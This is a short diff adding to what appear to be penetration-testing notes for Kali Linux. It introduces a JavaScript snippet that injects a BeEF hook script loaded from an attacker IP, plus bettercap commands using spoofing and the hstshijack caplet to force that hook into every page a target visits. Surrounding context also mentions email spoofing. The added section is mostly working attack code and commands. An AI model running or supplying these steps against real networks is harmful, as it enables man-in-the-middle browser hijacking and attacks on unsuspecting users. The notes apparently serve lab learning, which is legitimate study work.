@@ -181,4 +181,28 @@ msfconsole --resource /opt/BDFProxy/bdfproxy_msf_resource.rc
 
 * Email spoofing can be done by using a SMTP server, or using PHP mail functions coupled with a web hosting plan.
 
+* BeEF (Browser Exploitation Framework) can be used to launch attacks on a hooked target. A basic way of hooking a browser is by injecting the given script into the web file of Kali and visiting the IP address on target machine.
+
+* Script for injecting BeEF:
+
+```javascript
+var imported = document.createElement('script');
+imported.src = 'http://10.0.2.7:3000/hook.js';
+document.head.appendChild(imported);
+```
+
+* By using BeEF with Bettercap, we can inject JavaScript code into the target browser.
+
+```shell
+#first add BeEF injection script file location into hstshijack.cap payload section
+
+bettercap -iface eth0 -caplet spoof.cap
+
+hstshijack/hstshijack
+
+#if target computer loads any website on the browser now, it gets hooked to BeEF
+```
+
+* Once hooked, we can use BeEF commands to attack the target.
+
 ---
